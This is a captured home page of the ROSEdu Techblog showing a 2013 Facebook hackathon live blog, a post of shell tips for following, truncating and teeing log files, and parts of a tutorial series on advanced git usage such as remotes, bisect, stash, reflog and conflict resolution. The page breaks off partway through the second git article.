<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<!--[if lt IE 7]>
<html class="no-js lt-ie9 lt-ie8 lt-ie7 ie" lang="en"> <![endif]-->
<!--[if IE 7]>
<html class="no-js lt-ie9 lt-ie8 ie" lang="en"> <![endif]-->
<!--[if IE 8]>
<html class="no-js lt-ie9 ie" lang="en"> <![endif]-->
<!--[if gt IE 8]><!-->
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" class="no-js"><!--<![endif]-->
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>ROSEdu Techblog - Home</title>
    <link rel="stylesheet" href="./css/style.css" type="text/css">
    <link rel="stylesheet" href="./css/rosedu_links.css" type="text/css">
    <link rel="stylesheet" href="./css/syntax.css" type="text/css">
    <!--<link rel="stylesheet" type="text/css" href="/css/default.css"/>-->

    <script type="text/javascript">
      var _gaq = _gaq || [];
      _gaq.push(['_setAccount', 'UA-7579199-6']);
      _gaq.push(['_trackPageview']);

      (function () {
        var ga = document.createElement('script');
        ga.type = 'text/javascript';
        ga.async = true;
        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
        var s = document.getElementsByTagName('script')[0];
        s.parentNode.insertBefore(ga, s);
      })();
    </script>
  </head>

  <body>
    <div id="page" class="hentry">
      <header class="the-header">
        <div class="unit-head">
          <div class="unit-inner unit-head-inner">
            <nav class="nav-global">
              <ul>
                <li class="logo"><a href="./" title="Home">ROSEdu Techblog</a></li>
                <li class="about"><a href="./about.html">About</a></li>
                <li class="people"><a href="./people.html">People</a></li>
                <li class="archive"><a href="./archive.html">Archive</a></li>
                <li class="category"><a href="./tags.html">Tags</a></li>
              </ul>
            </nav>

            <hr />

            <nav class="nav-global">
              <ul>
                <li class="logo"><a href="./archive.html" title="Archive">Latest Posts</a></li>
                <!--TODO-->
                <li><a href="./shell-tips-and-tricks-for-file-editing.html">Shell tips and tricks for log files</a></li>
                <li><a href="./git-is-the-answer-3.html">Git Is The Answer 3/3</a></li>
                <li><a href="./git-is-the-answer-2.html">Git Is The Answer 2/3</a></li>
              </ul>
            </nav>
          </div><!-- unit-inner -->
        </div><!-- unit-head -->
      </header>

      <div class="body" role="main">
        <div class="unit-body">
          
  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./facebook-hackathon-live-blogging.html" title="Facebook Hackathon Live Blogging">Facebook Hackathon Live Blogging</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on October 19, 2013</span>
            by
            <span class="author">Alex Palcuie &amp; Marius Ungureanu</span>
            </span>

            <div class="right">
<img style="float:right" width="300" height="300" src="http://distilleryimage10.ak.instagram.com/b88daa3e38a911e3893622000a1fcd0b_7.jpg">
</div>
<h4 id="pm">3:30PM</h4>
<p>Ladies and gentleman, fast hackers and coder perfectionists, web developers and mobile app creators, we present you the first edition of the Facebook hackathon in Romania. Organized by your favorite open-source community ROSEdu, the volunteers have been busy all morning preparing the workspace for the 15 participating teams. We have pizza, beer and a mountain of bean bags for people who <em>move fast and break things</em>.</p>
<div style="clear:both;">

</div>
<h4 id="pm-1">3:30PM</h4>
<p>People have started their IDEs (or text editors for more hardcore people) and started installing their gems (Ruby guy here sorry). After a quick intro from the organizers about the rules, the Facebook engineers presented their skills and their expectations: it’s fun to code, but it’s awesome <strong>to ship</strong>. So happy shipping hackers!</p>
<div class="center">
<img width="600" height="400" src="https://fbcdn-sphotos-g-a.akamaihd.net/hphotos-ak-ash3/1381306_602864479775589_1298026562_n.jpg">
</div>
<h4 id="pm-2">5:30PM</h4>
<p>A brief pause and all the keyboard presses have stopped. The Facebook representatives have given out a random prize! One Facebook T-shirt. Congratulations to Andrei Duma! People are now back to coding and making their ideas come to life: <strong>done is better than perfect</strong>.</p>
<div class="center">
<img width="600" height="400" src="./images/facebook-hackathon/premii_facebook.jpg">
</div>
<h4 id="first-team">First team</h4>
<p>Only 4 hours in the event! We have interviewed some of the participants and they’re coding, designing and implementing their application basis! The first team we interviewed is <a href="https://github.com/rosedu/3_awesome_guyes_and_a_llama">3_awesome_guys_and_a_llama</a>. These students from the University “Politehnica” of Bucharest are writing an Event Planner. From what they told us, it’s an application which tries to help people organize events for them and their friends for their night out. It’s more focused on location, than being focused on time, so they can make it a planned drink-up or dance-off. They integrate it with the Facebook Places API and would like to have bars, clubs and restaurants use their app so people can make reservations. As technology stack, they have Python on top of Google App Engine. One of the devs said that he learned about it on a <a href="https://www.udacity.com/course/cs253">Udacity course</a> which I recommend it to you. They also plan to use Twitter’s Bootstrap library because they do not have enough frontend experience.</p>
<div class="center">
<img width="600" height="400" src="./images/facebook-hackathon/two_guys_llama.JPG">
</div>
<h4 id="be-green-recycle">Be green, recycle</h4>
<p>You are a human, walking down and you see a big pile of garbage. It’s a scenario common here in Romania. But what if you have an app for cleaning it? That’s what <a href="https://github.com/rosedu/sudoRecycle">sudoRecycle</a> is trying to do with their Android idea. You see the junk, take a photo, tag it with the GPS location and send it to their servers. Using their backend written in PHP, they will send teams of robots that will clean the area. Because we human beings are really lazy, they plan to use the Facebook API for gamification, so you could level up in cleaning the world.</p>
<div class="center">
<img width="600" height="400" src="./images/facebook-hackathon/sudo_recycle.JPG">
</div>
<h4 id="explore-the-underground">Explore the underground</h4>
<p>We’ve all endured the lack of knowledge of moving around Bucharest, if we haven’t lived here. But <a href="https://github.com/rosedu/Dark_side_of_the_moon">dark_side_of_the_moon</a> is going to remedy this with their offline mobile subway connection app. You want to get from X to Y using the shortest route. It also wants to tell you what ground-level public transportation is there and what you can visit. Furthermore they want it to tell your friends where you’ve been after you used its functionality to check-in at your destination. Under the hood, it’s using Android 4.0+ API and they want to integrate with the Facebook API to see the places your friends have visited. The coolest feature they want to code will tell you when the next tube will arrive.</p>
<div class="center">
<img width="600" height="400" src="./images/facebook-hackathon/pink_floyd.jpg">
</div>
<h4 id="grails">GRails</h4>
<p>Did you know that in the year 2013, if you apply to MIT, you must send the papers by fax or postal mail? And after you send them, a person will manually go through them and tell you that the papers have arrived? Or if you get into a university you must write 6 papers with about 60% redundant information? That’s what <a href="https://github.com/rosedu/GRails">GRails</a>, the only team made entirely of girls, is trying to solve, fighting bureaucracy with Rails 4. Now with 100% less paper involved!</p>
<div class="center">
<img width="600" height="400" src="./images/facebook-hackathon/grails.jpg">
</div>
<h4 id="hiking">Hiking</h4>
<p>Everybody knows that Romania has some of the best hiking routes, beautiful views and mysterious mountains. And who doesn’t want to know what trips you can make in the wild nature? Well, you can now check out a map and see what is available for adventurers! The map also shows you elevation, so you know if it’s a long road and also an abrupt road. A Django platform by <a href="https://github.com/rosedu/saltaretii">saltaretii</a> should be enough to support this paradise for nature’s explorers!</p>
<div class="center">
<img width="600" height="400" src="./images/facebook-hackathon/saltaretii.jpg">
</div>
<h4 id="i-want-to-ride-my-bicycle-i-want-to-ride-my-bike">I want to ride my bicycle, I want to ride my bike</h4>
<p>2 wheels, foot power and long distance travelling made easy! These two guys are achieving the awesome tool that brings bikers a dream app come true! Using complex algorithms, they want to give bikers many possible routes from one place to another. You can choose your own type of road, either abrupt and short or longer and less steep. The point? You can choose which kind of road you want and which is fit for you! If that is not enough, these 2 guys are doing this client side with ClojureScript… yeah, it’s the new functional kid in town which tries to solve the event driven callback hell. <a href="https://github.com/rosedu/flatride">FlatRide</a> on, people!</p>
<div class="center">
<img width="600" height="400" src="./images/facebook-hackathon/flatride.jpg">
</div>
<div class="right">
<img src="./images/facebook-hackathon/jackson.jpg">
</div>
<h4 id="jackson-gabbard"><a href="https://www.facebook.com/jg">Jackson Gabbard</a></h4>
<p>From an English major in Tennessee, to the 300th Facebook employee, to the 4th one to move in the new London office. He works on developer tools for the engineers and oversees some of the most important components like <em>Tasks</em> which devs open daily to get their job done. He is a self-taught hacker and he had an enlightment moment about the power of programming the first time he used the array structure.</p>
<p>He was really communicative and willing to tell us of his opinions, about the event, mentioning that he’s amazed about the main focus of students. ‘Transportation’, ‘Finding things’ and ‘Group organization’ are recurrent themes. He said some of his coworkers are Romanian and he thinks Romania is a land where lots of engineers are being created. Proud to be a full-time hackers around here!</p>
<p>We also asked him about the Bootcamp in London, which is about learning to code. And guess what? Even executives go through these preparations to get into Facebook. The engineering team has lots of fun hacking in that period of education. It teaches you how to love the company, you get to learn the ropes while communicating and interact with other mind-like people.</p>
<p>Finally he has participated in lockdowns each year. These are periods of time when teams gather in a room and stay there for several days (usually 30) and ship a big feature. Pretty hardcore, but that’s life at Facebook.</p>
<div style="clear:both;">

</div>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./shell-tips-and-tricks-for-file-editing.html" title="Shell tips and tricks for log files">Shell tips and tricks for log files</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on June 20, 2013</span>
            by
            <span class="author">Alexandru Juncu</span>
            </span>

            <p>Here are are some small things you might find useful when you need to deal with text files. In the Linux/Unix world, a lot of things are text files, so you need to know how to efficiently handle them. If you are a sysadmin, you need to look at <strong>log files</strong> for most of your work time and the following might come in handy.</p>
<h3 id="following-a-log-file">Following a log file</h3>
<p>Take your <code>$GENERIC_SERVICE</code> on your server that generates a lot of logs. You could open a <strong>text editor</strong> like <code>vi</code> or <code>emacs</code> to view the logs or use <code>tail</code> to see the latest lines (or a combination of tail and <code>head</code>). But you sometimes you need to view contents of the log in real time (while the service writes the lines, you read them). This is where the best use for the tail command comes in: the <code>--follow</code> flag.</p>
<pre><code>tail -f /var/log/mylog</code></pre>
<p>Tail usually creates a process that prints a few lines (the lines that exist when you run it), but with the <code>-f</code> flag, the tail process keeps running and prints new lines as the file is being appended. The process will close when the uses issues the <code>Cltr-D</code> (end of file) command.</p>
<h3 id="truncating-a-file">Truncating a file</h3>
<p>Maybe you need to clear the contents of a log file that has gotten too big. You could do a <code>rm</code> on the file and let the service write the new logs in a new file. Some services are picky and need the file to already exist, so you could use the <code>touch</code> command (that “updates” an existing file) which has the interesting side effect when applied on a non existing file: to create an empty file (a new inode with no data blocks).</p>
<p>But you just want to empty a file (same inode, just the contents cleared). You could use the <code>truncate</code> command with the size flag of 0 bytes (<code>-s 0</code>). Or make use of the redirect operator <code>&gt;</code>.</p>
<pre><code>:&gt;file</code></pre>
<p>or just</p>
<pre><code>&gt;file</code></pre>
<p>These will open the file, and redirect nothing into it. Since it is not appending anything, the contents will be erased. <code>:</code> is the no-op command so nothing will actually be done, but the shell with open and write (well … nothing) into the file because of the redirection operator <code>&gt;</code>.</p>
<h3 id="one-input-two-outputs">One input, two outputs</h3>
<p>Some programs do not have a logging system programmed into them and just print messages to standard output. Maybe you want to save that output into a file for future use. This is simple to do with a file redirection:</p>
<pre><code>./myprogram &gt; my_log_file</code></pre>
<p>But if you do this, you will lose the output to the (virtual) terminal. A very interesting command is <code>tee</code>, that takes an input and writes to standard output, but also writes into a specified file. You need to pipe the output of a process into tee like this:</p>
<pre><code>./myprogram | tee my_log_file</code></pre>
<p>Now you have both real time printing of the messages and you have them saved for future use.</p>
<p>Hope this helps!</p>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./git-is-the-answer-3.html" title="Git Is The Answer 3/3">Git Is The Answer 3/3</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on March 26, 2013</span>
            by
            <span class="author">Răzvan Deaconescu and Mihai Maruseac</span>
            </span>

            <p>Finally, the third article on advanced <a href="http://git-scm.com/" title="Git">git</a> topics will focus on things that many will use only in some very special cases.</p>
<h2 id="handling-multiple-remotes">Handling Multiple Remotes</h2>
<p>There are situations when you decide to use multiple remotes for a repository. For example, I’m using multiple remotes for my snippets repository:</p>
<pre><code>razvan@einherjar:~/code$ git remote show
gh
gl
glcs
origin

razvan@einherjar:~/code$ cat .git/config
[remote &quot;origin&quot;]
    fetch = +refs/heads/*:refs/remotes/origin/*
    url = razvan@swarm.cs.pub.ro:git-repos/code.git
[remote &quot;gh&quot;]
    url = git@github.com:razvand/snippets.git
    fetch = +refs/heads/*:refs/remotes/gh/*
[remote &quot;gl&quot;]
    url = git@gitlab.com:razvand/mine.git
    fetch = +refs/heads/*:refs/remotes/gl/*
[remote &quot;glcs&quot;]
    url = git@gitlab.cs.pub.ro:razvan.deaconescu/code.git
    fetch = +refs/heads/*:refs/remotes/glcs/*</code></pre>
<p>One particular situation when multiple remotes are required is when using a fork of a GitHub repository and doing <a href="https://help.github.com/articles/using-pull-requests" title="Using Pull Requests">pull requests</a>. This is also mentioned in the <a href="https://help.github.com/articles/syncing-a-fork" title="Syncing a fork">“Syncing a fork” article on GitHub</a>.</p>
<p>After you create a repository fork on GitHub, you clone that fork. For example, I’ve forked the <a href="https://github.com/rosedu/site">ROSEdu site repository</a> in <a href="https://github.com/razvand/site">my forked repository</a>. I’ve cloned <a href="https://github.com/razvand/site">the forked repository</a>, worked on the local clone and then pushed changes. I would then create a pull request with those changes, that that they would be integrated in <a href="https://github.com/rosedu/site">the main repository</a>.</p>
<p>A problem arises when the fork is not synced with the main repository. Ideally, there would be a GitHub option to sync the fork. Since that doesn’t exist, the fork needs to be updated manually, though the local copy, as mentioned in the <a href="https://help.github.com/articles/syncing-a-fork" title="Syncing a fork">“Syncing a fork” article on GitHub</a>.</p>
<p>First of all, you need to add the main repository as another remote to the local repository. This is a read-only remote. As suggested by GitHub, I’ve named this new remote <code>upstream</code>:</p>
<pre><code>razvan@einherjar:~/projects/rosedu/site/site.git$ git remote show
origin
upstream
razvan@einherjar:~/projects/rosedu/site/site.git$ git remote show upstream
* remote upstream
  Fetch URL: git@github.com:rosedu/site.git
[...]</code></pre>
<p>In order to sync the local repository with the <code>upstream</code> remote (<a href="https://github.com/rosedu/site">the main repository</a>) just fetch and rebase changes:</p>
<pre><code>razvan@einherjar:~/projects/rosedu/site/site.git$ git fetch upstream
remote: Counting objects: 16, done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 11 (delta 6), reused 9 (delta 4)
Unpacking objects: 100% (11/11), done.
From github.com:rosedu/site
   d21f23f..7411020  master     -&gt; upstream/master
razvan@einherjar:~/projects/rosedu/site/site.git$ git rebase upstream/master
First, rewinding head to replay your work on top of it...
Fast-forwarded master to upstream/master.</code></pre>
<p>This changes are then pushed to the <code>origin</code> remote (<a href="https://github.com/razvand/site">the forked repository</a>):</p>
<pre><code>razvan@einherjar:~/projects/rosedu/site/site.git$ git push origin master
Counting objects: 16, done.
Delta compression using up to 4 threads.
Compressing objects: 100% (11/11), done.
Writing objects: 100% (11/11), 1.99 KiB, done.
Total 11 (delta 6), reused 0 (delta 0)
To git@github.com:razvand/site.git
   6f3dd4d..7411020  master -&gt; master</code></pre>
<p>New local changes are then going to be pushed to the <code>origin</code> remote. These changes are then going to be aggregated into pull requests for the <code>upstream</code> remote (the main repository), now in sync with the forked repository.</p>
<p>The above is a specific use case for syncing a fork in GitHub, making use of two remotes: one for the original reposotiry and one for the fork. The <a href="https://help.github.com/articles/syncing-a-fork" title="Syncing a fork">excellent GitHub article</a> thoroughly describes the steps you need to undertake to sync your fork.</p>
<h2 id="bisecting-the-history">Bisecting the History</h2>
<p>A powerful feature of Git is its ability to quickly find out a commit which introduced a bad change. Suppose you have a bug in your application:</p>
<pre><code>$ ./test_math.py 
2 + 3 = 6</code></pre>
<p>Usually, it is possible that the bug was introduced several commits backwards in time and it is harder to solve by debugging. Git comes to help with <code>git bisect</code>. First, start, the process with <code>git bisect start</code> and mark a good and a bad commit (the boundaries of the bisect range).</p>
<pre><code>$ git bisect start
$ git bisect good 368297b26ac1f0dc4
$ git bisect bad
Bisecting: 7 revisions left to test after this (roughly 3 steps)
[9e7e7252bc95453817187ef4f1a8d69fd4ed74d7] Modify test_math.py</code></pre>
<p>Git has found a commit in the middle of the range. You test your code again and see if the problem is solved or not. Then pass <code>good</code> or <code>bad</code> to <code>git bisect</code></p>
<pre><code>$ ./test_math.py
2 + 3 = 5
$ git bisect good
Bisecting: 3 revisions left to test after this (roughly 2 steps)
[1c6fddb664ce6cb7bb483b8413b8e1216666c89f] Modify test_math.py (4).</code></pre>
<p>Continue this process until there are no more commits left in range.</p>
<pre><code>$ git bisect good 
1c6fddb664ce6cb7bb483b8413b8e1216666c89f is the first bad commit
commit 1c6fddb664ce6cb7bb483b8413b8e1216666c89f
Author: Andrei Petre &lt;p31andrei@gmail.com&gt;
Date:   Sat Mar 9 00:24:43 2013 +0200

    Modify test_math.py (4).</code></pre>
<p>Git even shows you the commit and it’s message. Now, do a simple <code>git show</code> to see the changeset of the bad commit:</p>
<pre><code>$ git show 1c6fddb664ce6cb7bb
commit 1c6fddb664ce6cb7bb483b8413b8e1216666c89f
Author: Andrei Petre &lt;p31andrei@gmail.com&gt;
Date:   Sat Mar 9 00:24:43 2013 +0200

    Modify test_math.py (4).

diff --git a/test_math.py b/test_math.py
index a6624f7..6e7f061 100755
--- a/test_math.py
+++ b/test_math.py
@@ -4,7 +4,7 @@ def custom_sum(*args):
     &quot;&quot;&quot;Calculate the sum of two given numbers.
        Make the sum work for multiple arguments
     &quot;&quot;&quot;
-    crt = 0
+    crt = 1
     for var in args:
         crt += var
     return crt</code></pre>
<p>In the end, you do a <code>git bisect reset</code> to return to the starting point. Do the fix, commit and continue contributing to the project.</p>
<p>Finally, you can use <code>git bisect</code> with automated tests. Start the bisection with <code>git bisect start</code> but pass the two end-points as well</p>
<pre><code>$ git bisect start HEAD 368297b26ac1f0dc4
Bisecting: 7 revisions left to test after this (roughly 3 steps)
[9e7e7252bc95453817187ef4f1a8d69fd4ed74d7] Modify test_math.py</code></pre>
<p>Then use <code>git bisect run</code> with a script which returns 0 if the code is ok or anything else if the bug is still present. Git will do the bisection for you.</p>
<pre><code>[mihai@esgaroth repo3]$ git bisect run ./test.sh
running ./test.sh
Bisecting: 3 revisions left to test after this (roughly 2 steps)
[1c6fddb664ce6cb7bb483b8413b8e1216666c89f] Modify test_math.py (4).
running ./test.sh
Bisecting: 1 revision left to test after this (roughly 1 step)
[d8a251d8348ac236d344a00b50a987e2af726663] Modify test_math.py (2).
running ./test.sh
Bisecting: 0 revisions left to test after this (roughly 0 steps)
[2a084b613f6b69cc8eb44648b8b5665402f5d9c0] Modify test_math.py (3).
running ./test.sh
1c6fddb664ce6cb7bb483b8413b8e1216666c89f is the first bad commit
commit 1c6fddb664ce6cb7bb483b8413b8e1216666c89f
Author: Andrei Petre &lt;p31andrei@gmail.com&gt;
Date:   Sat Mar 9 00:24:43 2013 +0200

    Modify test_math.py (4).

bisect run success</code></pre>
<p>This is indeed a good tool to have in Git’s toolbox.</p>
<h2 id="stashing-the-goodies">Stashing the Goodies</h2>
<p>It often happens that you’ve done some changes that you don’t want to commit yet but you need to sync with the remote repository (i.e. do a pull). Or you want to merge a branch without commiting your changes. In this case, the solution is using the stash.</p>
<p>The stash is a special place for Git where you temporarily stash your changes in order to keep your repository clean:</p>
<pre><code>razvan@einherjar:~/projects/rosedu/site/site.git$ git status
# On branch master
# Changes not staged for commit:
#   (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)
#   (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)
#
#	modified:   irc.markdown
#
no changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;)
razvan@einherjar:~/projects/rosedu/site/site.git$ git stash
Saved working directory and index state WIP on master: 7411020 Remove a stupid Maruku error.
HEAD is now at 7411020 Remove a stupid Maruku error.
razvan@einherjar:~/projects/rosedu/site/site.git$ git status
# On branch master
nothing to commit (working directory clean)
razvan@einherjar:~/projects/rosedu/site/site.git$ git stash pop
# On branch master
# Changes not staged for commit:
#   (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)
#   (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)
#
#	modified:   irc.markdown
#
no changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;)
Dropped refs/stash@{0} (940f594b5f93e616dc16285e0677fbc78aa33620)</code></pre>
<p>The moment you stash changes, they “disappear” from the working directory. You will be able to get them by using <code>git stash pop</code>.</p>
<p>When multiple users are working on a given repository it will often happen that you need to pull their updates to see what has been done. Your local copy may have changes you’ve made yourself, but still far from a commit. In that case you would stash your changes, pull remote updates to sync your repository and then pop the stash to continue your work.</p>
<h2 id="a-reference-for-everything">A Reference For Everything</h2>
<p>We are near the end of the series. You have learned several things and you might try others as well. Yet, from time to time you may find out that you have lost a commit while playing around. Or, you rebased somewhere in the past but you need a commit which you had skipped. Or, you used <code>git reset --hard</code> and threw out a needed commit.</p>
<p>Luckily for you, Git doesn’t lose anything. Everything can be recovered by using a nice feature called <em>reflog</em> (from <em>reference log</em>). Let’s see it in action first.</p>
<pre><code>$ git reflog
096bec6 HEAD@{0}: commit: Add suggestion from Stefan Bucur.
8647ca7 HEAD@{1}: rebase finished: returning to refs/heads/master
8647ca7 HEAD@{2}: checkout: moving from master to 8647ca7c213ef26fe3426e079356a8b9c0ef1a8f^0
f020807 HEAD@{3}: commit: Ready to publish «Git is the answer - part 2» article.
274c7bc HEAD@{4}: rebase finished: returning to refs/heads/master
274c7bc HEAD@{5}: checkout: moving from master to 274c7bcc89487e3b3e5f935694046caf17bf005f^0
97b6f11 HEAD@{6}: commit: Add TODO for conclusions.</code></pre>
<p>The first column lists the commit hash at the point where the reference points to. The second is the state of <code>HEAD</code> (<code>HEAD{1}</code> is where <code>HEAD</code> previously was and so on). Then, you have a short description of what the reference is about (a commit, a checkout, a merge, a reset, etc.). This helps you in remembering what each change was about.</p>
<p>To recover a commit you just cherry pick it from the reflog using its hash or even the <code>HEAD@{id}</code> reference.</p>
<h2 id="garbage-collecting-the-repository">Garbage Collecting the Repository</h2>
<p>In the end, let’s focus on trimming down the disk usage of the repository. We want to prune some references. First, we set an expire date:</p>
<pre><code>$ git reflog expire --expire=1.day refs/head/master</code></pre>
<p>The above marks all references older than 1 day as being obsolete.</p>
<p>The second step is to find all unreachable objects:</p>
<pre><code>$ git fsck --unreachable
Checking object directories: 100% (256/256), done.
Checking objects: 100% (80/80), done.
unreachable blob 0aa0869906576afbe970251418982a5ae1a21698
unreachable blob c1b86d806044ba5e344e037ec0128f7e944d0e0f
unreachable blob 1f4998496071654c1b16eb33932d9d8b4fee5971
unreachable tree 4b825dc642cb6eb9a060e54bf8d69288fbee4904
unreachable blob d9024465bff70288deaa116a646c01f1af7170b6
unreachable blob ec1a48a4de254e80e803b4a4daa4a1f87fe4acea
unreachable blob f0c2af9359d0c360fae9779f8c8b3143e7002810
unreachable blob 17135e0a43db16a2d127a4cb2a692b41257c8c26
unreachable tree 39d3a7c06c75d063cc13adde71b745f412a6f84f
unreachable tree fad372db5c9c9b842d3786733437c5e32dda426b
unreachable blob 07c469400c9ed887416d16a178a28cb911e6634e
unreachable tree 8c1deacee70bb3329ae6cd4fa2fbf546395ea712
unreachable blob ad85a1ec621c5b58fd6876c4d88982406bd48156
unreachable tree c865c8cb1344f77363c5314a91344623fe0dd661
unreachable blob cdd55939c346385b7938f392f958812b4fa5ddaf
unreachable blob d8255f99d74b09435a70ad3f2b23b0e69babc818
unreachable blob f7ddf120540a448c50baba1047230e9ad7d687ac
unreachable tree 30ce2c01c2792fdc4dfa6ab5c3e0c1cb876a405a
unreachable blob 09cf62d09bb027f7cfabcb0333c1837fda3c9c92
unreachable blob 435716d9434a852229aee58d16104c3335684113
unreachable blob 974f61a4933ee5608b1810e569593adf2ffedd0b
unreachable tree b3df14961958afa1b0434c1a31065751fef3b30d</code></pre>
<p>Finally, we prune everything and then garbage collect the repository.</p>
<pre><code>$ git prune
$ git gc
Counting objects: 652, done.
Delta compression using up to 4 threads.
Compressing objects: 100% (637/637), done.
Writing objects: 100% (652/652), done.
Total 652 (delta 373), reused 64 (delta 10)</code></pre>
<p>We can check the reduction in size by issuing a <code>du .</code> before and after the process. For this repository, we’ve managed to squeeze 3MB of space, not quite an impressive feat. However, for rapidly changing projects the gains should be higher.</p>
<p>In the end, looking at reflog we see</p>
<pre><code>$ git reflog --all
16a82d6 refs/remotes/gh/master@{0}: update by push
d3f979f refs/remotes/gh/master@{1}: update by push
454935e refs/remotes/gh/master@{2}: pull --rebase: fast-forward
bae10c0 refs/remotes/gh/master@{3}: update by push
c0a692b refs/remotes/gh/master@{4}: pull --rebase: fast-forward
04c5a1b refs/remotes/gh/master@{5}: pull --rebase: fast-forward
745963b refs/remotes/gh/master@{6}: pull --rebase: fast-forward
fd23db9</code></pre>
<p>The last line shows the id of one commit but nothing more related to it. You can still reset/rebase to there but you cannot point to any reference past it.</p>
<h2 id="closing-up">Closing Up</h2>
<p>We are at the close of this three part article on advanced git usage. Some of the things presented here might make you ask <em>when I’ll be using that?</em>. Some of them will prove useful from time to time while others are a good thing to know.</p>
<p>In the end, remember that Git is a swiss army knife among VCSs and there are a lot of features which will make us masters of it should we learn and practice using them. Like Vim, above a certain threshold Git can only be learnt by using it on a day to day basis.</p>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./git-is-the-answer-2.html" title="Git Is The Answer 2/3">Git Is The Answer 2/3</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on March 22, 2013</span>
            by
            <span class="author">Răzvan Deaconescu and Mihai Maruseac</span>
            </span>

            <p>The second article on advanced <a href="http://git-scm.com/" title="Git">git</a> topics is focused on cases where multiple branches are involved.</p>
<h2 id="my-changes-conflict-with-yours">My Changes Conflict With Yours</h2>
<p>Usually, it happens that two developers are working on the same file. Git tries its best to merge changesets from both developers without complaining. However, Git is not a human being so it cannot know what change is the good ones when two changes happen two close to one another in the file.</p>
<p>As opposed to SVN, in Git, it is the responsibility of the one who pulls to solve conflicts. Thus, you are forced to solve conflicts before being able to push your changes upstream. But how does it work?</p>
<p>When you try to pull a file which contains conflicting changes, git will stop with a strange message. We will use the <code>git pull --rebase</code> command instead of the <code>git pull</code>.</p>
<pre><code>Using index info to reconstruct a base tree...
M   numbers
Falling back to patching base and 3-way merge...
Auto-merging numbers
CONFLICT (content): Merge conflict in numbers
Failed to merge in the changes.
Patch failed at 0001 Add a don't like line.
The copy of the patch that failed is found in:
   /tmp/repos/repo3/.git/rebase-apply/patch

When you have resolved this problem, run &quot;git rebase --continue&quot;.
If you prefer to skip this patch, run &quot;git rebase --skip&quot; instead.
To check out the original branch and stop rebasing, run &quot;git rebase --abort&quot;.</code></pre>
<p>Even the file you changed looks awkward:</p>
<pre><code>4
&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD
insert here 5
=======
I don't like this line 5
&gt;&gt;&gt;&gt;&gt;&gt;&gt; Add a don't like line.
6</code></pre>
<p>As you can see, there are 3 more lines inserted. The ones starting with <code>&lt;&lt;&lt;&lt;&lt;&lt;&lt;</code> and <code>&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code> mark the boundary of the conflicting area as well as the origin of the two conflicting changes (in our case <code>HEAD</code> is our repository’s latest commit while <code>Add a don't like line.</code> is the commit message of the last commit on the remote).</p>
<p>Between the two marks, you have the two changes, separated by <code>=======</code>. You, as a developer, have to choose what makes sense: either keep only one of the changes, merge them together or even write something totally new.</p>
<p>You edit the file with the desired change and add it back for staging. After this you simply continue the rebase process.</p>
<pre><code>git add numbers
git rebase --continue</code></pre>
<p>If there are more conflicting changes you will have to reapply the same procedure. Otherwise, you can go forward to pushing your changes. As you can see, no conflict ever leaves your repository, you are forced to deal with it before continuing.</p>
<p><strong>Note</strong>: Remember to solve all conflicts in the same file before continuing the rebase process. Otherwise artifacts will be committed. (this is an edit suggested via comments by Stefan Bucur).</p>
<h2 id="tags-and-branches-for-the-win">Tags and Branches For The Win</h2>
<p>Tags are the best way to keep references to old commits. They are particularly helpful in school related activities, where you update lectures and lab tasks on an yearly basis.</p>
<p>The right way to handle this is to create a tag at the end of each year and update labs and tasks. If at any time you want to check out the old curriculum you can get back to that tag.</p>
<p>For example, for the <a href="http://elf.cs.pub.ro/saisp/" title="SAISP">SAISP</a> repository, we’ve created tag a tag at the end of each year of study:</p>
<pre><code>razvan@einherjar:~/school/current/saisp/repo$ git tag
2009-2010
2010-2011
2011-2012</code></pre>
<p>If we would like to go to an old version we would simply create a branch starting from that tag:</p>
<pre><code>razvan@einherjar:~/school/current/saisp/repo$ git checkout -b br-2010-2011 2010-2011
Switched to a new branch 'br-2010-2011'
